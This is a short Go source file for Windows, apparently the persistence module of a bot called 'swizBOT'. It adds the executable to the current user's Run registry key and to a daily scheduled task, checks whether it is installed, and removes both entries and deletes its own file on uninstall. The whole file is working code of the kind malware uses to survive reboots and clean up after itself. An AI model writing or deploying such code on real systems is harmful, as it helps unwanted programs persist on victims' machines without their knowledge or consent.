package main

import (
    "os"
    "os/exec"
    "golang.org/x/sys/windows/registry"
)

func isInstalled() bool {
    k, err := registry.OpenKey(registry.CURRENT_USER,
        `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
        registry.QUERY_VALUE)
    if err != nil {
        return false
    }
    defer k.Close()
    
    _, _, err = k.GetStringValue("swizBOT")
    return err == nil
}

func installPersistence() {
    exe, _ := os.Executable()
    
    // Registry persistence (userland)
    k, err := registry.OpenKey(registry.CURRENT_USER,
        `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
        registry.SET_VALUE)
    if err == nil {
        k.SetStringValue("swizBOT", exe)
        k.Close()
    }
    
    // Scheduled task (admin)
    exec.Command("schtasks", "/create", "/tn", "swizBOT",
        "/tr", exe, "/sc", "daily", "/st", "09:00", "/f").Run()
}

func uninstall() {
    k, err := registry.OpenKey(registry.CURRENT_USER,
        `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
        registry.SET_VALUE)
    if err == nil {
        k.DeleteValue("swizBOT")
        k.Close()
    }
    
    exec.Command("schtasks", "/delete", "/tn", "swizBOT", "/f").Run()
    os.Remove(os.Args[0])
}
